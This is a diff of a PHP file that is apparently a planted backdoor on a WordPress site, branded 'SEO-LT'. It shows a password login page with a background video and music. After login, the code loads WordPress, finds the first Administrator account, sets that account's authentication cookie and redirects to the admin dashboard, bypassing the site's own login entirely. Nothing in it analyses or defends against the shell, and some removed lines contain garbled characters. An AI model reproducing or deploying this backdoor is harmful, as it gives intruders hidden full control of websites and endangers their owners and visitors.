@@ -1,239 +1,131 @@
 <?php
 session_start();
+$hashed_password = '$2y$10$gPtjr.PZbo/9BLZp5Om6GO6SB4WJrSUXyRLJeoSS.khtAN/ZodUUu';
 
-// Password Bcrypt (hash dari "password123", ubah sesuai kebutuhan)
-$hashed_password = '$2y$10$fZ/ez7MrWDlly5MOHOaaZOdgNwmcWJTklpMB/oOL0V9HnNS5Crvmy';
-
-function login_shell()
-{
+// Cek login
+if (!isset($_SESSION['auth'])) {
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $hashed_password)) {
+        $_SESSION['auth'] = true;
+    } else {
 ?>
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SEO-LT</title>
-    
-    <!-- Favicon -->
-    <link rel="icon" type="image/png" href="https://desa-angin.pro/images/seo-lt.png">
-    
-    <style>
-        /* Styling halaman login */
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: url('https://ukrim.org/img/tiny.mp4') no-repeat center center;
-            background-size: cover;
-            font-family: Arial, sans-serif;
-            overflow: hidden;
-        }
-
-        .login-container {
-            background: rgba(0, 0, 0, 0.7);
-            padding: 20px;
-            border-radius: 8px;
-            color: #fff;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            text-align: center;
-        }
-
-        .login-container input[type="password"] {
-            padding: 10px;
-            border: 1px solid #4e4e4e69;
-            border-radius: 4px;
-            background: transparent;
-            color: #fff;
-            outline: none;
-            width: 200px;
-            text-align: center;
-        }
-
-        .login-container input[type="password"]::placeholder {
-            color: #ccc;
-        }
-
-        .login-container input[type="submit"] {
-            padding: 10px 20px;
-            border: none;
-            border-radius: 4px;
-            background: #4e4e4e69;
-            color: #fff;
-            cursor: pointer;
-            outline: none;
-        }
-
-        .login-container input[type="submit"]:hover {
-            background: #000;
-        }
-
-        .icon {
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-
-        /* Animasi teks berjalan */
-        .marquee-container {
-            position: fixed;
-            bottom: 0;
-            left: 500px;
-            right: 500px;
-            height: 50px;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            color: #fff;
-        }
-
-        .marquee {
-            white-space: nowrap;
-            display: inline-block;
-            padding-left: 75%;
-            animation: marquee 10s linear infinite;
-        }
-
-        @keyframes marquee {
-            from { transform: translateX(100%); }
-            to { transform: translateX(-100%); }
-        }
-
-        /* Posisi tombol kontrol musik */
-        .audio-container {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: rgba(0, 0, 0, 0.6);
-            padding: 10px;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-        }
-
-        .audio-container button {
-            background: none;
-            border: none;
-            color: white;
-            font-size: 18px;
-            cursor: pointer;
-            margin: 0 5px;
-        }
-
-        .audio-container button:hover {
-            color: #ffcc00;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SEO-LT</title>
+<link rel="icon" type="image/png" href="https://images2.imgbox.com/b9/06/D27xYwmx_o.png">
+<style>
+#bg-video{position:fixed!important;top:0!important;left:0!important;width:100vw!important;height:100vh!important;object-fit:cover!important;z-index:-2!important;}
+.video-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.4);z-index:-1;}
+body{margin:0;padding:0;height:100vh;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;overflow:hidden;}
+.login-container{background:rgba(0,0,0,0.7);padding:20px;border-radius:8px;color:#fff;box-shadow:0 4px 8px rgba(0,0,0,0.3);text-align:center;position:relative;z-index:10;max-width:300px;}
+.login-container input[type="password"]{padding:10px;border:1px solid #4e4e4e69;border-radius:4px;background:transparent;color:#fff;outline:none;width:100%;max-width:200px;text-align:center;box-sizing:border-box;margin:5px 0;}
+.login-container input[type="password"]::placeholder{color:#ccc;}
+.login-container input[type="submit"]{padding:10px 20px;border:none;border-radius:4px;background:#4e4e4e69;color:#fff;cursor:pointer;outline:none;width:100%;box-sizing:border-box;}
+.login-container input[type="submit"]:hover{background:#000;}
+.icon{font-size:28px;margin-bottom:15px;}
+.marquee-container{position:fixed;bottom:10px;left:0;right:0;height:40px;overflow:hidden;display:flex;align-items:center;color:#fff;font-size:14px;background:rgba(0,0,0,0.3);z-index:20;}
+.marquee{white-space:nowrap;display:inline-block;padding-left:100%;animation:marquee 15s linear infinite;}
+@keyframes marquee{0%{transform:translateX(100%);}100%{transform:translateX(-100%);}}
+.audio-container{position:fixed;top:20px;right:20px;background:rgba(0,0,0,0.8);padding:10px;border-radius:8px;display:flex;align-items:center;z-index:20;}
+.audio-container button{background:none;border:none;color:white;font-size:18px;cursor:pointer;margin:0 5px;padding:5px;}
+.audio-container button:hover{color:#ffcc00;}
+/* Mobile responsive */
+@media (max-width:768px){.marquee-container{left:20px;right:20px;font-size:12px;}.login-container{padding:15px;max-width:90%;}}
+</style>
 </head>
 <body>
+<!-- Video Background UTAMA -->
+<video id="bg-video" autoplay muted loop playsinline preload="auto" poster="https://desa-angin.pro/images/SEO-LT.jpg">
+    <source src="https://ukrim.org/img/tiny.mp4" type="video/mp4">
+    <!-- Fallback jika tiny.mp4 error -->
+    <source src="https://media.tenor.com/umRS1zU3OUsAAAPo/raiden-baal.mp4" type="video/mp4">
+</video>
 
-    <!-- Marquee copyright -->
-    <div class="marquee-container">
-        <div class="marquee">
-            copyright Ãƒâ€šÃ‚Â© SEO-LT
-        </div>
-    </div>
+<!-- Dark Overlay -->
+<div class="video-overlay"></div>
 
-    <!-- Form Login -->
-    <div class="login-container">
-        <div class="icon">ÃƒÂ°Ã…Â¸Ã¢â‚¬Ã¢â‚¬â„¢</div>
-        <form action="" method="post">
-            <input type="password" name="pass" placeholder="Password" required>
-            <br><br>
-            <input type="submit" name="submit" value="ÃƒÂ°Ã…Â¸Ã…Â¡Ã¢â€šÂ¬ Login">
-        </form>
-    </div>
+<!-- Marquee -->
+<div class="marquee-container">
+    <div class="marquee">copyright © SEO-LT - Protected by Advanced Security</div>
+</div>
 
-    <!-- Musik Otomatis -->
-    <audio id="bg-music" loop>
-        <source src="https://zhyper-shel.info/audio/music.mp3" type="audio/mpeg">
-        Browser Anda tidak mendukung audio.
-    </audio>
+<!-- Login Form -->
+<div class="login-container">
+    <div class="icon">🔒</div>
+    <h3>SEO-LT Panel</h3>
+    <form action="" method="post">
+        <input type="password" name="pass" placeholder="Masukkan Password" required>
+        <br>
+        <input type="submit" name="submit" value="🛡️ MASUK">
+    </form>
+</div>
 
-    <!-- Kontrol Musik -->
-    <div class="audio-container">
-        <button onclick="toggleMusic()">ÃƒÂ°Ã…Â¸Ã…Â½Ã‚Âµ Play/Pause</button>
-        <button onclick="muteMusic()">ÃƒÂ°Ã…Â¸Ã¢â‚¬Ã¢â‚¬Â¡ Mute</button>
-    </div>
+<!-- Background Music -->
+<audio id="bg-music" loop preload="auto">
+    <source src="https://lucky-prize.org/music/7-Orange.mp3" type="audio/mpeg">
+</audio>
 
-    <script>
-        var music = document.getElementById("bg-music");
-        music.volume = 0.5; // Volume default 50%
-        
-        function toggleMusic() {
-            if (music.paused) {
-                music.play();
-            } else {
-                music.pause();
-            }
-        }
+<!-- Music Controls -->
+<div class="audio-container">
+    <button onclick="toggleMusic()" title="Play/Pause">🎵</button>
+    <button onclick="muteMusic()" title="Mute">🔇</button>
+</div>
 
-        function muteMusic() {
-            music.muted = !music.muted;
-        }
+<script>
+var video = document.getElementById('bg-video');
+var music = document.getElementById('bg-music');
+music.volume = 0.3;
 
-        // Autoplay setelah user berinteraksi (fix untuk browser yang blokir autoplay)
-        document.body.addEventListener("click", function() {
-            music.play();
-        }, { once: true });
-    </script>
+// Force video play on interaction
+function initMedia() {
+    video.play().catch(e=>console.log('Video autoplay blocked'));
+    music.play().catch(e=>console.log('Music autoplay blocked'));
+}
+
+// Multiple triggers for autoplay policy
+document.addEventListener('click', initMedia, {once: true});
+document.addEventListener('touchstart', initMedia, {once: true});
+document.addEventListener('keydown', initMedia, {once: true});
+
+// Music controls
+function toggleMusic() {
+    if (music.paused) music.play();
+    else music.pause();
+}
+function muteMusic() {
+    music.muted = !music.muted;
+}
+
+// Restart video if ended (extra safety)
+video.addEventListener('ended', () => video.play());
+</script>
 
 </body>
 </html>
 <?php
-    exit;
-}
-
-// Cek sesi login
-if (!isset($_SESSION['auth'])) {
-    if (isset($_POST['pass']) && password_verify($_POST['pass'], $hashed_password)) {
-        $_SESSION['auth'] = true;
-        header("refresh: 0;");
-    } else {
-        login_shell();
+        exit;
     }
 }
 ?>
+
 <?php
-$mr=$_SERVER['DOCUMENT_ROOT'];
+// AUTO LOGIN WORDPRESS ADMIN (setelah login sukses)
+$mr = $_SERVER['DOCUMENT_ROOT'];
 @chdir($mr);
-if (file_exists('wp-load.php')){
-	include 'wp-load.php';
-	$wp_user_query = new WP_User_Query( array( 'role' => 'Administrator', 'number' => 1, 'fields' => 'ID' ) );
-	$results= $wp_user_query->get_results();
-
-	if ( isset( $results[0] ) ) {
-		wp_set_auth_cookie( $results[0] );
-		wp_redirect( admin_url() );
-		die();
-	}
-	die( 'NO ADMIN' );
-
+if (file_exists('wp-load.php')) {
+    require_once('wp-load.php');
+    $wp_user_query = new WP_User_Query(array('role' => 'Administrator', 'number' => 1, 'fields' => array('ID')));
+    $results = $wp_user_query->get_results();
+    
+    if (!empty($results)) {
+        wp_set_auth_cookie($results[0], true);
+        wp_redirect(admin_url());
+        exit;
+    }
+    echo '<h1>NO ADMIN FOUND</h1>';
+} else {
+    echo '<h1>WordPress NOT FOUND</h1>';
 }
-else{
-	die('Failed to load');
-}
-
-?>
-<?php
-$mr=$_SERVER['DOCUMENT_ROOT'];
-@chdir($mr);
-if (file_exists('wp-load.php')){
-	include 'wp-load.php';
-	$wp_user_query = new WP_User_Query( array( 'role' => 'Administrator', 'number' => 1, 'fields' => 'ID' ) );
-	$results= $wp_user_query->get_results();
-
-	if ( isset( $results[0] ) ) {
-		wp_set_auth_cookie( $results[0] );
-		wp_redirect( admin_url() );
-		die();
-	}
-	die( 'NO ADMIN' );
-
-}
-else{
-	die('Failed to load');
-}
-
 ?>
